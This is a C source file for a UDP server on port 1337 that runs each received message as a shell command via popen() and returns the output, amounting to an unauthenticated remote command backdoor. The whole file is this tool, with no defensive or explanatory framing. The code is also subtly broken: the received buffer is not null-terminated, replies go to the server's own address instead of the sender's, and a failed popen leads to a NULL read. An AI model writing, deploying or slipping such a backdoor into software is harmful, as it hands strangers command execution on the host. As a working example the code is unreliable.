#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#define BUFLEN 512
#define PORT 1337

void err(char *str)
{
    perror(str);
    exit(1);
}

int main(void)
{
    struct sockaddr_in my_addr, cli_addr;
    int sockfd, s;
    socklen_t slen=sizeof(cli_addr);
    char buf[BUFLEN];
    
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP))==-1)
        err("socket");
    else
        printf("Server : Socket() successful\n");
    
    bzero(&my_addr, sizeof(my_addr));
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(PORT);
    my_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    
    if (bind(sockfd, (struct sockaddr* ) &my_addr, sizeof(my_addr))==-1)
        err("bind");
    else
        printf("Server : bind() successful\n");
    
    while(1)
    {
        int read = recvfrom(sockfd, buf, BUFLEN, 0, (struct sockaddr*)&cli_addr, &slen);
            
            if (!read) break; // done reading
            if (read < 0) err("Client read failed\n");
            
            FILE *fp;
			char path[1035];

			fp = popen(buf, "r");
			if (fp == NULL) {
				printf("Failed to run command\n" );
			}

			while (fgets(path, sizeof(path)-1, fp) != NULL) {
			(sendto(sockfd, path, strlen(path) , 0 , (struct sockaddr *) &my_addr, slen)==-1);
			}

			pclose(fp);;
    }
    
    close(sockfd);
    return 0;
}
